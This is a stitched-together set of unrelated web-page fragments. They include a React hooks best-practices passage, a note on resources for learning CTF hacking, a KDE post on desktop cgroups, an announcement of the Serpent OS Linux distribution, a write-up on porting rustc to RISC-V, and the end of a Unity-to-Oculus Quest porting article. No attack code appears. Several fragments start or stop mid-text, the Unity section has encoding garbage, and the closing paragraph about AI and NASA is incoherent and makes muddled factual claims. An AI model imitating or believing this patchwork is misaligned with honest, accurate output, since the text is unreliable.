  <span>const</span> fetchData <span>=</span> <span>useCallback</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>setLoading</span><span>(</span><span>true</span><span>)</span><span>;</span>
    <span>callApi</span><span>(</span><span>)</span>
      <span>.</span><span>then</span><span>(</span><span>(</span><span>res</span><span>)</span> <span>=&gt;</span> <span>setData</span><span>(</span>res<span>)</span><span>)</span>
      <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> <span>setError</span><span>(</span>err<span>)</span><span>)</span>
      <span>.</span><span>finally</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setLoading</span><span>(</span><span>false</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span><span>]</span><span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>fetchData</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>fetchData<span>]</span><span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>if</span> <span>(</span><span>!</span>loading <span>&amp;&amp;</span> <span>!</span>error <span>&amp;&amp;</span> data<span>)</span> <span>{</span>
<span>      <span>onSuccess</span><span>(</span><span>)</span><span>;</span></span>    <span>}</span>
  <span>}</span><span>,</span> <span>[</span>loading<span>,</span> error<span>,</span> data<span>,</span> onSuccess<span>]</span><span>)</span><span>;</span>

  <span>return</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>Data: </span><span>{</span>data<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<h3>The problem ⚡</h3>
<p>There are two <code>useEffect</code> hooks, the first one is handling the api call on the initial render and the second one will call the <code>onSuccess</code> function, by assuming when there is no loading, no error, but data in the state, it must have been a successful call. Make sense right?</p>
<p>Sure for the first call this is true and probably will never fail. But you also loose the direct connection between the action and the function that needs to be called. Also there is no 100% guarantee that this case will only happen if the fetch action has succeeded and this is something we as developers really don't like.</p>
<h3>The solution ✅</h3>
<p>A straight forward solution would be to set the "onSuccess" function to the actual place where the call was successful:</p>
<div data-language="jsx"><pre><code><span>function</span> <span>DataList</span><span>(</span><span><span>{</span> onSuccess <span>}</span></span><span>)</span> <span>{</span>
  <span>const</span> <span>[</span>loading<span>,</span> setLoading<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>false</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>error<span>,</span> setError<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>
  <span>const</span> <span>[</span>data<span>,</span> setData<span>]</span> <span>=</span> <span>useState</span><span>(</span><span>null</span><span>)</span><span>;</span>

  <span>const</span> fetchData <span>=</span> <span>useCallback</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>setLoading</span><span>(</span><span>true</span><span>)</span><span>;</span>
    <span>callApi</span><span>(</span><span>)</span>
      <span>.</span><span>then</span><span>(</span><span>(</span><span>fetchedData</span><span>)</span> <span>=&gt;</span> <span>{</span>
        <span>setData</span><span>(</span>fetchedData<span>)</span><span>;</span>
<span>        <span>onSuccess</span><span>(</span><span>)</span><span>;</span></span>      <span>}</span><span>)</span>
      <span>.</span><span>catch</span><span>(</span><span>(</span><span>err</span><span>)</span> <span>=&gt;</span> <span>setError</span><span>(</span>err<span>)</span><span>)</span>
      <span>.</span><span>finally</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>setLoading</span><span>(</span><span>false</span><span>)</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>onSuccess<span>]</span><span>)</span><span>;</span>

  <span>useEffect</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>fetchData</span><span>(</span><span>)</span><span>;</span>
  <span>}</span><span>,</span> <span>[</span>fetchData<span>]</span><span>)</span><span>;</span>

  <span>return</span> <span><span><span>&lt;</span>div</span><span>&gt;</span></span><span>{</span>data<span>}</span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<p>Now it is quite clear at the first sight when the onSuccess is called, exactly in the success case of the api call.</p>
<h2>4. Single responsibility components</h2>
<p>Composing components can be hard.
When is it time to split a component into several smaller components?
How do you structure the component tree?
All of these questions arise every day when working with a component-based framework.
However, a common mistake in designing your components is to combine two use cases into a single component.
Let's take an example of a header that shows either a burger button on mobile devices or tabs on desktop screens. (The condition will be handled the the magical <code>isMobile</code> function, which is not part of this example 🧙‍)</p>
<h3>This is dangerous ❌</h3>
<div data-language="jsx"><pre><code><span>function</span> <span>Header</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span>header</span><span>&gt;</span></span><span>
      </span><span><span><span>&lt;</span><span>HeaderInner</span></span> <span>menuItems</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span><span>
    </span><span><span><span>&lt;/</span>header</span><span>&gt;</span></span>
  <span>)</span><span>;</span>
<span>}</span>

<span>function</span> <span>HeaderInner</span><span>(</span><span><span>{</span> menuItems <span>}</span></span><span>)</span> <span>{</span>
  <span>return</span> <span>isMobile</span><span>(</span><span>)</span> <span>?</span> <span><span><span>&lt;</span><span>BurgerButton</span></span> <span>menuItems</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span> <span>:</span> <span><span><span>&lt;</span><span>Tabs</span></span> <span>tabData</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span><span>;</span>
<span>}</span></code></pre></div>
<h3>The problem ⚡</h3>
<p>With this approach the component HeaderInner is trying to be two different things at once and we all learned from <a href="https://en.wikipedia.org/wiki/Strange_Case_of_Dr_Jekyll_and_Mr_Hyde">Mr. Jekyll</a>, being more than one thing at a time isn't really ideal.
Also it makes it even hard to test or to reuse the component at other places.</p>
<h3>The solution ✅</h3>
<p>Bringing the condition one level up, makes it easier to see what the components are made for and that they only have one responsibility, being a <code>Header</code>, <code>Tabs</code> or a <code>BurgerButton</code> and not trying to be two things at once.</p>
<div data-language="jsx"><pre><code><span>function</span> <span>Header</span><span>(</span><span>props</span><span>)</span> <span>{</span>
  <span>return</span> <span>(</span>
    <span><span><span>&lt;</span>header</span><span>&gt;</span></span><span>{</span><span>isMobile</span><span>(</span><span>)</span> <span>?</span> <span><span><span>&lt;</span><span>BurgerButton</span></span> <span>menuItems</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span> <span>:</span> <span><span><span>&lt;</span><span>Tabs</span></span> <span>tabData</span><span><span>=</span><span>{</span>menuItems<span>}</span></span> <span>/&gt;</span></span><span>}</span><span><span><span>&lt;/</span>header</span><span>&gt;</span></span>
  <span>)</span><span>;</span>
<span>}</span></code></pre></div>
<h2>5. Single responsibility useEffects</h2>
<p>Remember the times, where we only had the <code>componentWillReceiveProps</code> or <code>componentDidUpdate</code> methods to hook into the rendering process of a react component? It is bringing back dark memories and also realizing the beauty of using the <code>useEffect</code> hook and especially that you can have as much as you want of them.</p>
<p>But sometimes forgetting and using a "useEffect" for several things brings back those dark memories. For example, imagine you have a component that fetches some data from the backend in some way, and also displays breadcrumbs depending on the current location. (Using again <a href="https://reacttraining.com/react-router/">react-router</a> for getting the current location.)</p></div></div>

      I strongly recommend general programming knowledge. This course is a good starting <a href="https://www.coursera.org/learn/python">point</a> for complete beginners to programming and there are a ton more online.<br>
      If you know C/C++ and/or Assembly-bonus points. You will like reverse
      engineering and binary exploitation.<br>
      If you know JavaScript, PHP, and/or SQL, you will enjoy web security.<br>
      I chose tutorials that were hands-on and engaging so readers don't lose interest.
      CTF stands for Capture the Flag, which are hacking contests that happen online every weekend: <a href="https://ctftime.org/">CTFtime</a><br>
      A rule of thumb is to try each problem for 20 minutes to the best of your ability-use google, look at man pages and online documentation
      THEN ask for help.<br> Most websites like HacktheBox, TryHackMe, picoCTF, and others have Discords that are full
      of professionals.<br>
      Another site you may want to checkout is<a href="https://secure.meetup.com/login/"> meetup.com</a>, to meet other hackers and coders who can mentor you, or your local 2600 hacker group(i.e. <a href="https://www.phx2600.org/">Phoenix</a>).

	<!-- .entry-header -->

	<div>
		<p>A desktop environment's sole role is to connect users to their applications. This includes everything from launching apps to actually displaying apps but also managing them and making sure they run fairly. Everyone is familiar the concept of a "Task manager" (like ksysguard), but over time they haven't kept up with the way applications are being developed or the latest developments from Linux.</p>

<h2>Managing running processes</h2>
<p>There used to be a time where one PID == one "application". The kwrite process represents Kwrite, the firefox process represents Firefox, easy. but this has changed. To pick an extreme example:<br>
<strong>Discord in a flatpak is 13 processes!</strong></p>
<p>It basically renders our task manager's process view unusable. All the names are random gibberish, trying to kill the application or setting nice levels becomes a guessing game.  Parent trees can help, but they only get you so far.</p>
<p>It's unusable for me, it's probably unusable for any user and gets in the way of feeling in control of your computer.</p>
<p>We need some metadata.</p>
<h2>Fair resource distribution</h2>
<p>As mentioned above discord in a flatpak is 13 processes. Krita is one process.</p>
<ul>
<li>One will be straining the CPU because it is a highly sophisticated application doing highly complicated graphic operations</li>
<li>One will be straining the CPU because it's written in electron</li>
</ul>
<p>To a kernel scheduler all it would see are 14 opaque processes. It has no knowledge that they are grouped as two different things. It won't be able to come up with something that's fair.</p>
<p>We need some metadata.</p>
<p>(caveat: Obviously most proceses are idling, and I've ignored threads for the purposes of making a point, don't write about it)</p>
<h2>It's hard to map things</h2>
<p>Currently the only metadata of the "application" is on a window.  To show a user friendly name and icon in ksysguard (or any other system monitor) we have to fetch a list of all processes, fetch a list of all windows and perform a mashup. Coming up with arbitrary heuristics for handling parent PIDs which is unstable and messy.</p>
<p>To give some different real world examples:</p>
<ul>
<li>In plasma's task manager we show an audio indicator next to the relevant window, we do this by matching PIDs of what's playing audio to the PID of a window. Easy for the simple case... however as soon as we go multi-process we have to track the parent PID, and each "fix" just alternates between one bug and another.</li>
<li>With PID namespaces apps can't correctly report client PIDs anymore.</li>
<li>We lose information on what "app" we've spawned. We have bug reports where people have two different taskmanager entries for "Firefox" and "Firefox (nightly)" however once the process is spawned that information is lost - the application reports itself as one consistent name and our taskbar gets confused.</li>
</ul>
<p>We need some metadata.</p>

<h2>This is a solved problem!</h2>
<p>A modern sysadmin doesn't deal in processes, but cgroups. The cgroup manager (which will be typically systemd) spawns each service as one cgroup. It uses cgroups to know what's running, the kernel can see what things belong together. </p>
<p>On the desktop flatpaks will spawn themselves in cgroups so that they can use the relevant namespace features.</p>
<p>You're probably already using cgroups. As part of a <a href="https://systemd.io/DESKTOP_ENVIRONMENTS">cross-desktop effort</a> we want to bring cgroups to the entire desktop.</p>
<h2>Example</h2>
<p>Before and after of our system monitor<br>
<a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/old1.png" alt=""></a></p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/ksysguardqml_apps-1024x772.png" alt=""></a></p>
<p>Ultimately the same data but way easier to read..</p>

<p>Another key part of cgroup usage is the concept of slices. Cgroups are based on a heirachical structure, with slices as logical places to split resource usage. We don't adjust resources globally, we adjust resources within our slice, which then provides information to the scheduler.</p>
<p><a href="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png"><img src="http://blog.davidedmundson.co.uk/wp-content/uploads/2020/12/treepie.png" alt=""></a></p>
<p>Conceptually you can imagine that we just adjust resources within our level of a tree. Then the kernel magically takes care of the rest.</p>
<p>More information can be found on slices in this excellent series <a href="https://www.redhat.com/en/blog/world-domination-cgroups-part-2-turning-knobs"> World domination with cgroups</a>.</p>
<h2>Default slices</h2>
<p>This means we can set up some predefined slices. Within the relevant user slice this will consist shared of</p>
<ul>
<li>applications</li>
<li>the system (kwin/mutter, plasmashell)</li>
<li>background services (baloo, tracker)</li>
</ul>
<p>Each of these slices can be given some default prioritisations and OOM settings out of the box.</p>
<h2>Dynamic resource shifting</h2>
<p>Now that we are using slices, and only adjusting our relative weight within the slice, we can shift resource priority to the application owning the focused window.</p>
<p>This only has any effect if your system is running at full steam from mulitple sources at once, but it can provide a slicker response at no drawback.</p>
<h2>Why slice, doesn't nice suffice?</h2>
<p>Nice is a single value, global across the entire system. Because of this user processes can only be lowered, but never raised to avoid messing with the system.  With slices we're only adjusting relative weight compared to services within our slice. So it's safe to give the user full control within their slice. Any adjustments to an application, won't impact system services or other users.</p>
<p>It also doesn't conflict with nice values set by the application explicitly. If we set kdevelop to have greater CPU weight, clang won't suddenly take over the whole computer when compiling.</p>

<h2>CGroup extra features</h2>
<p>CGroup's come with a lot of new features that aren't available on a per-process level. </p>
<p>We can:</p>
<ul>
<li>Set limits so that a CPU can't use more than N% </li>
<li>We can gracefully close processes on logout</li>
<li>We can disable networking</li>
<li>We can set memory limits</li>
<li>We can prevent forkbombs</li>
<li>We can provide hints to the OOM killer not just with a weight but with expected ranges that should be considered normal</li>
<li>We can freeze groups of processes (which will be useful for Plasma mobile)<br>
... </li>
</ul>
<p>All of this is easy to add for a user / system administrator. Using drop in's one can just add a .service file [example file link] to ~/.config/systemd/user.control/app-firefox@.service and manipulate any of these.</p>
<p>[caveat, some of those features works for applications created as new transient services, not the lite version using scopes that's currently merged in KDE/Gnome - maybe worth mentioning]</p>

<p>Plasma 5.19 and recent Gnome now spawn applications into respective cgroups, but we're not yet surfacing the results that we can get from this.</p>
<p>For the KDE devs providing the metadata is easy.</p>
<p>If spawning a new application from an existing application be sure to use either <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1ApplicationLauncherJob.html"><code>ApplicationLauncherJob</code></a> or <a href="https://api.kde.org/frameworks/kio/html/classKIO_1_1CommandLauncherJob.html"><code>CommandLauncherJob</code></a> and set the respective service. Everything else is then handled automagically. You should be using these classes anyway for spawning new services.</p>
<p>For users, you can spawn an application with either <code><code>kstart5 --application foo.desktop"</code></code></p>
<p>That change to the launching is relatively tiny, but getting to this point in Plasma wasn't easy - there were a lot of edge cases that messed up the grouping correctly.</p>
<ul>
<li>kinit, our zygote process really meddled with keeping things grouped correctly</li>
<li>drkonqi, our crash handler and application restarter</li>
<li>dbus activation has no knowledge of the associated .desktop file if an application is DBus activated (such as spectacle our screenshot tool)</li>
<li>and many many more papercuts throughout of different launches</li>
</ul>
<p>Also to fully capitalise on slices we need to move all our background processes into managed services and slices. This is worthy of another (equally lengthy) blog post.</p>
<h2>How you can help?</h2>
<p>It's been a battle to find these edge cases.<br>
Whilst running your system, please run systemd-cgls and point out any applications (not background services yet) that are not in their appropriate cgroup.</p>

<p>(e.g BSD users)</p>
<p>As we're just adding metadata, everything used now will continue to work exactly as it does now. All existing tools work exactly the same. Within our task manager we still will keep a process view (it's still useful regardless) and we won't put in any code that relies on the cgroup metadata present. We'll keep the existing heuristics for matching windows with external events, cgroup metadata would just be a strongly influence factor in that. Things won't get worse, but we won't be able to capitalise on the new features discussed here, </p>

    <div>
        <article>
            <p>Serpent OS is (or at least, will be) a Linux distribution with notably different goals
from the mainstream offering. We’re in the process of establishing the project, with
development properly starting towards the end of July.</p>
<h4 id="naming">Naming</h4>
<p>Eventually our plan is to rebrand as ‘Serpent Linux*’ - however we will first need to
complete some early donkey work and apply for a sublicense to use the name. As explained
below, this is <em>not</em> Serpent ‘GNU/Linux’ as the distribution will not be dependent on
a GNU toolchain or runtime. For those who are curious, we’re working with an artist to
choose an appropriate logo for the project.</p>
<h4 id="aims">Aims</h4>
<p>The vast majority of Linux distributions have highly similar goals, and can be best
described using these common industry buzzwords:</p>
<pre><code>Modern, lightweight, privacy oriented/respecting, user-friendly desktop
</code></pre>
<p>We’re focused on building a Linux distribution that serves our own needs.
Chiefly, a Linux distribution for people who want to use Linux, not a “Linux-based-OS”
focusing on interoptability with macOS* + Windows*.</p>
<p>In a nut shell, this is <strong>not</strong> “Linux for the masses”. This is a project setting out to
use Linux as Linux should be used. This will in turn help us to build a significantly
advanced Linux distribution that is both modular and optimised for modern machines.</p>
<h4 id="a-truly-modern-linux-distribution">A Truly Modern Linux Distribution</h4>
<p>As we’re taking a distro-first, compatibility-later approach, our design decisions
will allow us to take some bold steps. We’ll also be able to incorporate all of the
more sensible design improvements in Linux distribution design over the last decade or
so:</p>
<ul>
<li>No more usrbin split</li>
<li>100% clang-built throughout (including kernel)</li>
<li>musl as libc, relying on compiler optimisations instead of inline asm</li>
<li><code>libc++</code> instead of <code>libstdc++</code></li>
<li>LLVM’s binutils variants (<code>lld</code>, <code>as</code>, etc.)</li>
<li>Mixed source/binary distribution</li>
<li>Moving away from <code>x86_64-generic</code> baseline to newer CPUs, including Intel and AMD specific optimisations</li>
<li>Capability based subscriptions in package manager (Hardware/ user choice / etc)</li>
<li><code>UEFI</code> only. No more legacy boot.</li>
<li>Completely open source, down to the bootstrap / rebuild scripts</li>
<li>Seriously optimised for serious workloads.</li>
<li>Third party applications reliant on containers only. No compat-hacks</li>
<li>Wayland-only. X11 compatibility via containers will be investigated</li>
<li>Fully stateless with management tools and upstreaming of patches</li>
<li>Lots, lots more. We’ll blog about it.</li>
</ul>
<h4 id="opinionated-by-default">Opinionated By Default</h4>
<p>A recurring theme that holds back the development of world-class Linux, is high tolerance
for those holding Linux back. A perfect example is NVIDIA* and their lack of support for
accelerated Wayland support on their GPUs. Consequently, our project won’t tolerate such
decisions and will instead blacklist the NVIDIA proprietary drivers from the distribution.</p>
<p>There are other examples that will emerge over time, and will become quite clear.</p>
<p>The time for Linux distributions giving in, with thousands of man hours wasted working around
negative actors, had come to an end.</p>

<p>We will only accept community involvement via our IRC channel: <code>#serpentOS</code> on Freenode.
We will not operate a public bug tracker or forums. Once we are past out initial bootstrap
phase we will set up an email address to help reporting security issues to the team, and
we will of course release security notices.</p>
<p>In terms of feature requests, these will be largely at the discretion of core contributors.
When a company has been formed to house this project, we’re happy to hash out an SLA for
required works.</p>
<h4 id="timescale">Timescale</h4>
<p>It may seem incredibly odd launching a website before there is a distro to show off, however,
it became very apparent that the cat would be out of the bag, so we wanted to be prepared.</p>
<p>Currently, the Founder is in the midst of relocating to the Republic of Ireland. Once complete
we’ll move to stage2 of our bootstrap process and begin working on the tooling needed for the
base development.</p>

assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

                    <p>This is the final article from the series about porting Unity SteamVR games to Oculus Quest.
The previous articles in the series:
<a href="https://exyte.com/blog/porting-basic-unity-steamvr-games-functionality-to-oculus-quest">Porting basic Unity SteamVR game's functionality to Oculus Quest</a>
<a href="https://exyte.com/blog/optimization-techniques-for-porting-unity-steamvr-games-to-oculus-quest">Optimization techniques for porting Unity SteamVR games to Oculus Quest</a></p>
<h2>Automated artifact building</h2>
<p>You may know that itâ€™s possible to automate artifact building in Unity. And of course, itâ€™s possible to automate artifact building for Windows and Oculus Quest while having the same code for both platforms. We added a batch file build.bat that is used by both developers and the build-server. This script is configured with several options and will execute platform-specific code to prepare and build the project in Unityâ€™s batch mode.</p>
<p><img src="https://exyte.com/upload/1593497398642-1.png" alt=""></p><p>build.bat:
</p>
<p>BuildScript.cs:
</p>
<p>Here you can see an example with light that is baked pre-build. We use Progressive GPU Lightmapper to achieve this, and you can find the OpenCL platform and device values in the <a rel="nofollow" href="https://docs.unity3d.com/Manual/GPUProgressiveLightmapper.html">documentation</a>. We take care of the baked light before building because we use procedural generation to slightly tweak scenes. You can remove these options if you donâ€™t use baked lighting or if its parameters are platform-independent.</p>
<p>One of the most annoying things related to building both for Windows and Oculus Quest is that you have to compress textures by using ASTC for Oculus Quest. That means textures are extracted and compressed each time you switch between two platforms while building artifacts. Switching from Windows to Oculus Quest might take 2 to 5 hours depending on the number of textures. We found that the most effective way is to clone the project repo in 2 separate directories for each platform and then build them independently. Obviously, we still retain the same codebase. We replicated this approach on our build-server (Jenkins) by creating 2 different projects with separate workspaces for each platform.</p>
<h2>Conclusion</h2>
<p>With this article we finish our series about porting SteamVR games to Oculus Quest. Our goal was to explain our approach to having shared code and resources for both platforms to reduce development and maintenance costs. This approach is certainly not universal, but it worked for our project and might work for yours. We hope that the articles answered most of the questions you might have during the porting process and saved some of your time.</p>

<p>AI having an expanding onto many places such as astronomically, e-commercially, economically, and many on other platforms.</p>
<p>Astronomically, the human’s having the suffer of the moon and more planet and researching about them and improving the ability of own to resolve those issue to the moon. Therefore, we can get useful information about it.</p>
<p>NASA has been a major place for astronomically to getting information about the planet, moon, sun, earth, etc.</p>
<p>NASA’s founded many of the planet and satellite in space. They have provided information about them among us. So, They’re been very helpful to us.</p>
<p>By Artificial Intelligence, the E-commercial system like the <a href="https://shiv1367.com/transmission-control-protocol-tcp"><span>internet</span></a> is connected to all e-commercial things globally. So, people are making easy to sell out any product on the internet.</p>
